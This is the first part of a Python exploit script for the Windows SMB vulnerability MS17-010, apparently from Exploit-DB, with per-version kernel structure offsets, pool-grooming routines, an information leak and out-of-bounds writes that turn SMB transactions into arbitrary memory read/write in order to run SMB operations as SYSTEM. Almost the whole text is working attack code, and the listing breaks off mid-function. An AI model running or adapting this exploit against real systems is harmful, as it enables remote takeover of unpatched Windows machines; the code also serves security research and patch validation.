#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

EDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = ''
PASSWORD = ''

'''
A transaction with empty setup:
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier
- no lookaside or caching method for allocating it

Note: method name is from NSA eternalromance

For Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit
for freed pool from large pool). Additionally, the exploit does the information leak to check transactions
alignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.

For Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size
smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But
a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).
Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment
in this private heap should be very easy and very reliable (fish in a barrel in NSA eternalromance). The drawback
of this method is we cannot do information leak to verify transactions alignment before OOB write.
So this exploit has a chance to crash target same as NSA eternalromance against Windows Vista and earlier.
'''

'''
Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
win7 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	PACCESS_TOKEN Token;  // 0x08
	DWORD xx2;
	BOOLEAN CopyOnOpen; // 0x14
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x18
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x20
}
win2012 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	QWORD xx2;
	QWORD xx3;
	PACCESS_TOKEN Token;  // 0x18
	DWORD xx4;
	BOOLEAN CopyOnOpen; // 0x24
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x28
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x30
}

SrvImpersonateSecurityContext() is used in Windows Vista and later before doing any operation as logged on user.
It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. 
From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,
PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns
STATUS_SUCCESS when Token is NULL.
If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)
to do all SMB operations.
Note: for Windows 2003 and earlier, the exploit modify token user and groups in PCtxtHandle to get SYSTEM because only
  ImpersonateSecurityContext() is used in these Windows versions.
'''
###########################
# info for modify session security context
###########################
WIN7_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xa0,
	'SESSION_ISNULL_OFFSET': 0xba,
	'FAKE_SECCTX': pack('<IIQQIIB', 0x28022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x28,
}

WIN7_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x80,
	'SESSION_ISNULL_OFFSET': 0x96,
	'FAKE_SECCTX': pack('<IIIIIIB', 0x1c022a, 1, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x1c,
}

# win8+ info
WIN8_64_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0xb0,
	'SESSION_ISNULL_OFFSET': 0xca,
	'FAKE_SECCTX': pack('<IIQQQQIIB', 0x38022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x38,
}

WIN8_32_SESSION_INFO = {
	'SESSION_SECCTX_OFFSET': 0x88,
	'SESSION_ISNULL_OFFSET': 0x9e,
	'FAKE_SECCTX': pack('<IIIIIIIIB', 0x24022a, 1, 0, 0, 0, 0, 2, 0, 1),
	'SECCTX_SIZE': 0x24,
}

# win 2003 (xp 64 bit is win 2003)
WIN2K3_64_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0xba,
	'SESSION_SECCTX_OFFSET': 0xa0,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
	'SECCTX_PCTXTHANDLE_OFFSET': 0x10,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x40,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K3_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x96,
	'SESSION_SECCTX_OFFSET': 0x80,  # Win2k3 has another struct to keep PCtxtHandle (similar to 2008+)
	'SECCTX_PCTXTHANDLE_OFFSET': 0xc,  # PCtxtHandle is at offset 0x8 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

# win xp
WINXP_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x4c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x68,
}

WIN2K_32_SESSION_INFO = {
	'SESSION_ISNULL_OFFSET': 0x94,
	'SESSION_SECCTX_OFFSET': 0x84,  # PCtxtHandle is at offset 0x80 but only upperPart is needed
	'PCTXTHANDLE_TOKEN_OFFSET': 0x24,
	'TOKEN_USER_GROUP_CNT_OFFSET': 0x3c,
	'TOKEN_USER_GROUP_ADDR_OFFSET': 0x58,
}

###########################
# info for exploitation
###########################
# for windows 2008+
WIN7_32_TRANS_INFO = {
	'TRANS_SIZE' : 0xa0,  # struct size
	'TRANS_FLINK_OFFSET' : 0x18,
	'TRANS_INPARAM_OFFSET' : 0x40,
	'TRANS_OUTPARAM_OFFSET' : 0x44,
	'TRANS_INDATA_OFFSET' : 0x48,
	'TRANS_OUTDATA_OFFSET' : 0x4c,
	'TRANS_PARAMCNT_OFFSET' : 0x58,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x5c,
	'TRANS_FUNCTION_OFFSET' : 0x72,
	'TRANS_MID_OFFSET' : 0x80,
}

WIN7_64_TRANS_INFO = {
	'TRANS_SIZE' : 0xf8,  # struct size
	'TRANS_FLINK_OFFSET' : 0x28,
	'TRANS_INPARAM_OFFSET' : 0x70,
	'TRANS_OUTPARAM_OFFSET' : 0x78,
	'TRANS_INDATA_OFFSET' : 0x80,
	'TRANS_OUTDATA_OFFSET' : 0x88,
	'TRANS_PARAMCNT_OFFSET' : 0x98,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x9c,
	'TRANS_FUNCTION_OFFSET' : 0xb2,
	'TRANS_MID_OFFSET' : 0xc0,
}

WIN5_32_TRANS_INFO = {
	'TRANS_SIZE' : 0x98,  # struct size
	'TRANS_FLINK_OFFSET' : 0x18,
	'TRANS_INPARAM_OFFSET' : 0x3c,
	'TRANS_OUTPARAM_OFFSET' : 0x40,
	'TRANS_INDATA_OFFSET' : 0x44,
	'TRANS_OUTDATA_OFFSET' : 0x48,
	'TRANS_PARAMCNT_OFFSET' : 0x54,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x58,
	'TRANS_FUNCTION_OFFSET' : 0x6e,
	'TRANS_PID_OFFSET' : 0x78,
	'TRANS_MID_OFFSET' : 0x7c,
}

WIN5_64_TRANS_INFO = {
	'TRANS_SIZE' : 0xe0,  # struct size
	'TRANS_FLINK_OFFSET' : 0x28,
	'TRANS_INPARAM_OFFSET' : 0x68,
	'TRANS_OUTPARAM_OFFSET' : 0x70,
	'TRANS_INDATA_OFFSET' : 0x78,
	'TRANS_OUTDATA_OFFSET' : 0x80,
	'TRANS_PARAMCNT_OFFSET' : 0x90,
	'TRANS_TOTALPARAMCNT_OFFSET' : 0x94,
	'TRANS_FUNCTION_OFFSET' : 0xaa,
	'TRANS_PID_OFFSET' : 0xb4,
	'TRANS_MID_OFFSET' : 0xb8,
}

X86_INFO = {
	'ARCH' : 'x86',
	'PTR_SIZE' : 4,
	'PTR_FMT' : 'I',
	'FRAG_TAG_OFFSET' : 12,
	'POOL_ALIGN' : 8,
	'SRV_BUFHDR_SIZE' : 8,
}

X64_INFO = {
	'ARCH' : 'x64',
	'PTR_SIZE' : 8,
	'PTR_FMT' : 'Q',
	'FRAG_TAG_OFFSET' : 0x14,
	'POOL_ALIGN' : 0x10,
	'SRV_BUFHDR_SIZE' : 0x10,
}

def merge_dicts(*dict_args):
	result = {}
	for dictionary in dict_args:
		result.update(dictionary)
	return result

OS_ARCH_INFO = {
	# for Windows Vista, 2008, 7 and 2008 R2
	'WIN7': {
		'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN7_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN7_64_SESSION_INFO),
	},
	# for Windows 8 and later
	'WIN8': {
		'x86': merge_dicts(X86_INFO, WIN7_32_TRANS_INFO, WIN8_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN7_64_TRANS_INFO, WIN8_64_SESSION_INFO),
	},
	'WINXP': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WINXP_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
	},
	'WIN2K3': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K3_32_SESSION_INFO),
		'x64': merge_dicts(X64_INFO, WIN5_64_TRANS_INFO, WIN2K3_64_SESSION_INFO),
	},
	'WIN2K': {
		'x86': merge_dicts(X86_INFO, WIN5_32_TRANS_INFO, WIN2K_32_SESSION_INFO),
	},
}


TRANS_NAME_LEN = 4
HEAP_HDR_SIZE = 8  # heap chunk header size


def calc_alloc_size(size, align_size):
	return (size + align_size - 1) & ~(align_size-1)

def wait_for_request_processed(conn):
	#time.sleep(0.05)
	# send echo is faster than sleep(0.05) when connection is very good
	conn.send_echo('a')

def find_named_pipe(conn):
	pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	found_pipe = None
	for pipe in pipes:
		try:
			fid = conn.nt_create_andx(tid, pipe)
			conn.close(tid, fid)
			found_pipe = pipe
		except smb.SessionError as e:
			pass
	
	conn.disconnect_tree(tid)
	return found_pipe


special_mid = 0
extra_last_mid = 0
def reset_extra_mid(conn):
	global extra_last_mid, special_mid
	special_mid = (conn.next_mid() & 0xff00) - 0x100
	extra_last_mid = special_mid
	
def next_extra_mid():
	global extra_last_mid
	extra_last_mid += 1
	return extra_last_mid


# Borrow 'groom' and 'bride' word from NSA tool
# GROOM_TRANS_SIZE includes transaction name, parameters and data
# Note: the GROOM_TRANS_SIZE size MUST be multiple of 16 to make FRAG_TAG_OFFSET valid
GROOM_TRANS_SIZE = 0x5010

def leak_frag_size(conn, tid, fid):
	# this method can be used on Windows Vista/2008 and later
	# leak "Frag" pool size and determine target architecture
	info = {}
	
	# A "Frag" pool is placed after the large pool allocation if last page has some free space left.
	# A "Frag" pool size (on 64-bit) is 0x10 or 0x20 depended on Windows version.
	# To make exploit more generic, exploit does info leak to find a "Frag" pool size.
	# From the leak info, we can determine the target architecture too.
	mid = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
	req2 = conn.create_nt_trans_secondary_packet(mid, data='B'*276) # leak more 276 bytes
	
	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2)
	leakData = conn.recv_transaction_data(mid, 0x10d0+276)
	leakData = leakData[0x10d4:]  # skip parameters and its own input
	# Detect target architecture and calculate frag pool size
	if leakData[X86_INFO['FRAG_TAG_OFFSET']:X86_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print('Target is 32 bit')
		info['arch'] = 'x86'
		info['FRAG_POOL_SIZE'] = ord(leakData[ X86_INFO['FRAG_TAG_OFFSET']-2 ]) * X86_INFO['POOL_ALIGN']
	elif leakData[X64_INFO['FRAG_TAG_OFFSET']:X64_INFO['FRAG_TAG_OFFSET']+4] == 'Frag':
		print('Target is 64 bit')
		info['arch'] = 'x64'
		info['FRAG_POOL_SIZE'] = ord(leakData[ X64_INFO['FRAG_TAG_OFFSET']-2 ]) * X64_INFO['POOL_ALIGN']
	else:
		print('Not found Frag pool tag in leak data')
		sys.exit()
	
	print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
	return info


def read_data(conn, info, read_addr, read_size):
	fmt = info['PTR_FMT']
	# modify trans2.OutParameter to leak next transaction and trans2.OutData to leak real data
	# modify trans2.*ParameterCount and trans2.*DataCount to limit data
	new_data = pack('<'+fmt*3, info['trans2_addr']+info['TRANS_FLINK_OFFSET'], info['trans2_addr']+0x200, read_addr)  # OutParameter, InData, OutData
	new_data += pack('<II', 0, 0)  # SetupCount, MaxSetupCount
	new_data += pack('<III', 8, 8, 8)  # ParamterCount, TotalParamterCount, MaxParameterCount
	new_data += pack('<III', read_size, read_size, read_size)  # DataCount, TotalDataCount, MaxDataCount
	new_data += pack('<HH', 0, 5)  # Category, Function (NT_RENAME)
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=new_data, dataDisplacement=info['TRANS_OUTPARAM_OFFSET'])
	
	# create one more transaction before leaking data
	# - next transaction can be used for arbitrary read/write after the current trans2 is done
	# - next transaction address is from TransactionListEntry.Flink value
	conn.send_nt_trans(5, param=pack('<HH', info['fid'], 0), totalDataCount=0x4300-0x20, totalParameterCount=0x1000)

	# finish the trans2 to leak
	conn.send_nt_trans_secondary(mid=info['trans2_mid'])
	read_data = conn.recv_transaction_data(info['trans2_mid'], 8+read_size)
	
	# set new trans2 address
	info['trans2_addr'] = unpack_from('<'+fmt, read_data)[0] - info['TRANS_FLINK_OFFSET']
	
	# set trans1.InData to &trans2
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], param=pack('<'+fmt, info['trans2_addr']), paramDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans2 mid
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)
	
	return read_data[8:]  # no need to return parameter

def write_data(conn, info, write_addr, write_data):
	# trans2.InData
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<'+info['PTR_FMT'], write_addr), dataDisplacement=info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)
	
	# write data
	conn.send_nt_trans_secondary(mid=info['trans2_mid'], data=write_data)
	wait_for_request_processed(conn)


def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	trans_param = pack('<HH', fid, 0)  # param for NT_RENAME
	# fill large pagedpool holes (maybe no need)
	for i in range(numFill):
		conn.send_nt_trans(5, param=trans_param, totalDataCount=0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0)

	mid_ntrename = conn.next_mid()
	# first GROOM, for leaking next BRIDE transaction
	req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data='A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
	req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='B'*276) # leak more 276 bytes
	# second GROOM, for controlling next BRIDE transaction
	req3 = conn.create_nt_trans_packet(5, param=trans_param, mid=fid, totalDataCount=info['GROOM_DATA_SIZE']-0x1000, maxParameterCount=0x1000)
	# many BRIDEs, expect two of them are allocated at splitted pool from GROOM
	reqs = []
	for i in range(12):
		mid = next_extra_mid()
		reqs.append(conn.create_trans_packet('', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))

	conn.send_raw(req1[:-8])
	conn.send_raw(req1[-8:]+req2+req3+''.join(reqs))
	
	# expected transactions alignment ("Frag" pool is not shown)
	#
	#    |         5 * PAGE_SIZE         |   PAGE_SIZE    |         5 * PAGE_SIZE         |   PAGE_SIZE    |
	#    +-------------------------------+----------------+-------------------------------+----------------+
	#    |    GROOM mid=mid_ntrename        |  extra_mid1 |         GROOM mid=fid            |  extra_mid2 |
	#    +-------------------------------+----------------+-------------------------------+----------------+
	#
	# If transactions are aligned as we expected, BRIDE transaction with mid=extra_mid1 will be leaked.
	# From leaked transaction, we get
	# - leaked transaction address from InParameter or InData
	# - transaction, with mid=extra_mid2, address from LIST_ENTRY.Flink
	# With these information, we can verify the transaction aligment from displacement.

	leakData = conn.recv_transaction_data(mid_ntrename, 0x10d0+276)
	leakData = leakData[0x10d4:]  # skip parameters and its own input
	#open('leak.dat', 'wb').write(leakData)

	if leakData[info['FRAG_TAG_OFFSET']:info['FRAG_TAG_OFFSET']+4] != 'Frag':
		print('Not found Frag pool tag in leak data')
		return None
	
	# ================================
	# verify leak data
	# ================================
	leakData = leakData[info['FRAG_TAG_OFFSET']-4+info['FRAG_POOL_SIZE']:]
	# check pool tag and size value in buffer header
	expected_size = pack('<H', info['BRIDE_TRANS_SIZE'])
	leakTransOffset = info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE']
	if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
		print('No transaction struct in leak data')
		return None

	leakTrans = leakData[leakTransOffset:]

	ptrf = info['PTR_FMT']
	_, connection_addr, session_addr, treeconnect_addr, flink_value = unpack_from('<'+ptrf*5, leakTrans, 8)
	inparam_value = unpack_from('<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
	leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]

	print('CONNECTION: 0x{:x}'.format(connection_addr))
	print('SESSION: 0x{:x}'.format(session_addr))
	print('FLINK: 0x{:x}'.format(flink_value))
	print('InParam: 0x{:x}'.format(inparam_value))
	print('MID: 0x{:x}'.format(leak_mid))

	next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
	if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
		print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
		return None
	# trans1: leak transaction
	# trans2: next transaction
	return {
		'connection': connection_addr,
		'session': session_addr,
		'next_page_addr': next_page_addr,
		'trans1_mid': leak_mid,
		'trans1_addr': inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN,
		'trans2_addr': flink_value - info['TRANS_FLINK_OFFSET'],
	}

def exploit_matched_pairs(conn, pipe_name, info):
	# for Windows 7/2008 R2 and later
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	conn.set_default_tid(tid)
	# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
	fid = conn.nt_create_andx(tid, pipe_name)
	
	info.update(leak_frag_size(conn, tid, fid))
	# add os and arch specific exploit info
	info.update(OS_ARCH_INFO[info['os']][info['arch']])
	
	# groom: srv buffer header
	info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
	print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
	# groom paramters and data is alignment by 8 because it is NT_TRANS
	info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  # alignment (4)

	# bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
	bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
	info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
	print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
	# bride paramters and data is alignment by 4 because it is TRANS
	info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
	
	# ================================
	# try align pagedpool and leak info until satisfy
	# ================================
	leakInfo = None
	# max attempt: 10
	for i in range(10):
		reset_extra_mid(conn)
		leakInfo = align_transaction_and_leak(conn, tid, fid, info)
		if leakInfo is not None:
			break
		print('leak failed... try again')
		conn.close(tid, fid)
		conn.disconnect_tree(tid)
		
		tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
		conn.set_default_tid(tid)
		fid = conn.nt_create_andx(tid, pipe_name)

	if leakInfo is None:
		return False
	
	info['fid'] = fid
	info.update(leakInfo)

	# ================================
	# shift transGroom.Indata ptr with SmbWriteAndX
	# ================================
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(fid, 'A'*shift_indata_byte)

	# Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a wrong place.
	#       So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
	# maxParameterCount (0x1000), trans name (4), param (4)
	indata_value = info['next_page_addr'] + info['TRANS_SIZE'] + 8 + info['SRV_BUFHDR_SIZE'] + 0x1000 + shift_indata_byte
	indata_next_trans_displacement = info['trans2_addr'] - indata_value
	conn.send_nt_trans_secondary(mid=fid, data='\x00', dataDisplacement=indata_next_trans_displacement + info['TRANS_MID_OFFSET'])
	wait_for_request_processed(conn)

	# if the overwritten is correct, a modified transaction mid should be special_mid now.
	# a new transaction with special_mid should be error.
	recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
	if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
		print('!!! Write to wrong place !!!')
		print('the target might be crashed')
		return False

	print('success controlling groom transaction')

	# NSA exploit set refCnt on leaked transaction to very large number for reading data repeatly
	# but this method make the transation never get freed
	# I will avoid memory leak
	
	# ================================
	# modify trans1 struct to be used for arbitrary read/write
	# ================================
	print('modify trans1 struct for arbitrary read/write')
	fmt = info['PTR_FMT']
	# use transGroom to modify trans2.InData to &trans1. so we can modify trans1 with trans2 data
	conn.send_nt_trans_secondary(mid=fid, data=pack('<'+fmt, info['trans1_addr']), dataDisplacement=indata_next_trans_displacement + info['TRANS_INDATA_OFFSET'])
	wait_for_request_processed(conn)

	# modify
	# - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
	# - trans1.InData to &trans2. so we can modify trans2 with trans1 data
	conn.send_nt_trans_secondary(mid=special_mid, data=pack('<'+fmt*3, info['trans1_addr'], info['trans1_addr']+0x200, info['trans2_addr']), dataDisplacement=info['TRANS_INPARAM_OFFSET'])
	wait_for_request_processed(conn)

	# modify trans2.mid
	info['trans2_mid'] = conn.next_mid()
	conn.send_nt_trans_secondary(mid=info['trans1_mid'], data=pack('<H', info['trans2_mid']), dataDisplacement=info['TRANS_MID_OFFSET'])
	return True

def exploit_fish_barrel(conn, pipe_name, info):
	# for Windows Vista/2008 and earlier
	
	tid = conn.tree_connect_andx('\\\\'+conn.get_remote_host()+'\\'+'IPC$')
	conn.set_default_tid(tid)
	# fid for first open is always 0x4000. We can open named pipe multiple times to get other fids.
	fid = conn.nt_create_andx(tid, pipe_name)
	info['fid'] = fid

	if info['os'] == 'WIN7' and 'arch' not in info:
		# leak_frag_size() can be used against Windows Vista/2008 to determine target architecture
		info.update(leak_frag_size(conn, tid, fid))
	
	if 'arch' in info:
		# add os and arch specific exploit info
		info.update(OS_ARCH_INFO[info['os']][info['arch']])
		attempt_list = [ OS_ARCH_INFO[info['os']][info['arch']] ]
	else:
		# do not know target architecture
		# this case is only for Windows 2003
		# try offset of 64 bit then 32 bit because no target architecture
		attempt_list = [ OS_ARCH_INFO[info['os']]['x64'], OS_ARCH_INFO[info['os']]['x86'] ]
	
	# ================================
	# groom packets
	# ================================
	# sum of transaction name, parameters and data length is 0x1000
	# paramterCount = 0x100-TRANS_NAME_LEN
	print('Groom packets')
	trans_param = pack('<HH', info['fid'], 0)
	for i in range(12):
		mid = info['fid'] if i == 8 else next_extra_mid()
		conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, maxParameterCount=0x40, maxDataCount=0)	
	
	# expected transactions alignment
	#
	#    +-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+
	#    |  mid=mid1 |  mid=mid2 |             |  mid=mid8 |  mid=fid  |  mid=mid9 | mid=mid10 | mid=mid11 |
	#    +-----------+-----------+-----...-----+-----------+-----------+-----------+-----------+-----------+
	#                                                         trans1       trans2

	# ================================
	# shift transaction Indata ptr with SmbWriteAndX
	# ================================
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(info['fid'], 'A'*shift_indata_byte)
	
	# ================================
	# Dangerous operation: attempt to control one transaction
	# ================================
	# Note: POOL_ALIGN value is same as heap alignment value
	success = False
	for tinfo in attempt_list:
		print('attempt controlling next transaction on ' + tinfo['ARCH'])
		HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
		NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE

		# Below operation is dangerous. Write only 1 byte with '\x00' might be safe even alignment is wrong.
		conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
		wait_for_request_processed(conn)

		# if the overwritten is correct, a modified transaction mid should be special_mid now.
		# a new transaction with special_mid should be error.
		recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
		if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
			print('success controlling one transaction')
			success = True
			if 'arch' not in info:
				print('Target is '+tinfo['ARCH'])
				info['arch'] = tinfo['ARCH']
				info.update(OS_ARCH_INFO[info['os']][info['arch']])
			break
		if recvPkt.getNTStatus() != 0:
			print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
	
	if not success:
		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
		print('!!! Write to wrong place !!!')
		print('the target might be crashed')
		return False


	# NSA eternalromance modify transaction RefCount to keep controlled and reuse transaction after leaking info.
	# This is easy to to but the modified transaction will never be freed. The next exploit attempt might be harder
	#   because of this unfreed memory chunk. I will avoid it.
	
	# From a picture above, now we can only control trans2 by trans1 data. Also we know only offset of these two 
	# transactions (do not know the address).
	# After reading memory by modifying and completing trans2, trans2 cannot be used anymore.
	# To be able to use trans1 after trans2 is gone, we need to modify trans1 to be able to modify itself.
	# To be able to modify trans1 struct, we need to use trans2 param or data but write backward.
	# On 32 bit target, we can write to any address if parameter count is 0xffffffff.
	# On 64 bit target, modifying paramter count is not enough because address size is 64 bit. Because our transactions
	#   are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward with offset only,
	#   we also modify HIDWORD of InParameter to 0xffffffff.
	
	print('modify parameter count to 0xffffffff to be able to write backward')
	conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
	# on 64 bit, modify InParameter last 4 bytes to \xff\xff\xff\xff too
	if info['arch'] == 'x64':
		conn.send_trans_secondary(mid=info['fid'], data='\xff'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
	wait_for_request_processed(conn)
	
	TRANS_CHUNK_SIZE = HEAP_HDR_SIZE + info['TRANS_SIZE'] + 0x1000 + HEAP_CHUNK_PAD_SIZE
	PREV_TRANS_DISPLACEMENT = TRANS_CHUNK_SIZE + info['TRANS_SIZE'] + TRANS_NAME_LEN
	PREV_TRANS_OFFSET = 0x100000000 - PREV_TRANS_DISPLACEMENT

	# modify paramterCount of first transaction
	conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_TOTALPARAMCNT_OFFSET'])
	if info['arch'] == 'x64':
		conn.send_nt_trans_secondary(mid=special_mid, param='\xff'*4, paramDisplacement=PREV_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
		# restore trans2.InParameters pointer before leaking next transaction
		conn.send_trans_secondary(mid=info['fid'], data='\x00'*4, dataDisplacement=NEXT_TRANS_OFFSET+info['TRANS_INPARAM_OFFSET']+4)
